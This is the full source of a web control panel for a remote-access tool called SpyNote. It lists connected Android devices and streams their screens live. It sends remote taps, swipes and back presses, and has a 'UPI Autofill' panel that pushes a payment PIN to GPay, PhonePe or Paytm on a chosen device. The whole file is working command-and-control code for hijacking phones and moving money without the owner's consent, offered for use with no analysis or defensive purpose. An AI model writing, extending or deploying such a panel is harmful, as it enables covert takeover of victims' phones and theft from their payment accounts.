<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Control Panel v2.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; }
        .device:hover { background: #555; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; }
        .disconnected { opacity: 0.5; }

        #phone-frame {
            width: 400px; height: 800px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            image-rendering: pixelated;
        }
        #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
        #controls { text-align: center; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); }
        button {
            padding: 12px 24px; margin: 0 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-size: 14px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
        button.danger { background: linear-gradient(45deg, #ff4444, #cc0000); }
        button.success { background: linear-gradient(45deg, #00ff88, #00cc66); }
        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
            padding: 10px; border-radius: 5px; font-size: 12px; }
        
        #upi-panel {
            position: fixed; top: 80px; right: 10px; 
            background: rgba(0,0,0,0.95); padding: 20px; 
            border-radius: 10px; backdrop-filter: blur(15px); min-width: 220px;
        }
        #upi-panel h3 { color: #00ff88; margin-bottom: 15px; font-size: 16px; }
        input[type="text"] { 
            width: 100%; padding: 12px; margin: 8px 0; 
            background: #333; color: white; border: 2px solid #555; 
            border-radius: 8px; font-size: 18px; font-weight: bold;
            letter-spacing: 4px; text-align: center;
        }
        input[type="text"]:focus { border-color: #00ff88; outline: none; }
        .toggle-switch { display: flex; align-items: center; margin: 10px 0; }
        .toggle-switch input[type="checkbox"] { width: 0; height: 0; opacity: 0; }
        .toggle-slider {
            position: relative; width: 50px; height: 24px; 
            background: #555; border-radius: 12px; margin: 0 10px;
            transition: 0.3s; cursor: pointer;
        }
        .toggle-slider:before {
            content: ''; position: absolute; top: 2px; left: 2px;
            width: 20px; height: 20px; background: #ccc;
            border-radius: 50%; transition: 0.3s;
        }
        input[type="checkbox"]:checked + .toggle-slider { background: #00ff88; }
        input[type="checkbox"]:checked + .toggle-slider:before { transform: translateX(26px); }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="upi-panel">
        <h3>üîê UPI Autofill</h3>
        <input type="text" id="upiPin" placeholder="1234" maxlength="6" autocomplete="one-time-code">
        <div class="toggle-switch">
            <label>Autofill:</label>
            <input type="checkbox" id="autofillToggle">
            <label class="toggle-slider"></label>
        </div>
        <button class="success" onclick="sendUpiPin()">‚úÖ Apply PIN</button>
        <small style="color: #00ff88;">Works: GPay/PhonePe/Paytm</small>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let autofillEnabled = false;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsCounter = document.getElementById('fps-counter');
        const fpsDisplay = document.getElementById('fps');
        const upiPinInput = document.getElementById('upiPin');
        const autofillToggle = document.getElementById('autofillToggle');

        // Socket events
        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsCounter.textContent = `FPS: ${fps}`;
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screen update error:', e);
            }
        });

        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand} ${info.version || ''}</small>
                        ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                    </div>
                `).join('') : 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
        }

        // Touch/Mouse Controls
        let startX = 0, startY = 0, dragging = false;

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
                sendTap(startX, startY);
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => dragging = false);
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        // üî• NEW UPI AUTOFILL
        function sendUpiPin() {
            if (!currentDevice) return;
            const pin = upiPinInput.value.trim();
            if (pin.length < 4) {
                alert('Enter 4-6 digit UPI PIN');
                return;
            }
            
            socket.emit('upi-pin', { 
                deviceId: currentDevice, 
                pin: pin, 
                enabled: autofillEnabled 
            });
            
            console.log('‚úÖ UPI PIN sent:', pin);
        }

        autofillToggle.addEventListener('change', () => {
            autofillEnabled = autofillToggle.checked;
            if (currentDevice) {
                socket.emit('autofill-toggle', { 
                    deviceId: currentDevice, 
                    enabled: autofillEnabled 
                });
            }
            upiPinInput.focus();
        });

        upiPinInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendUpiPin();
        });

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }
    </script>
</body>
</html>
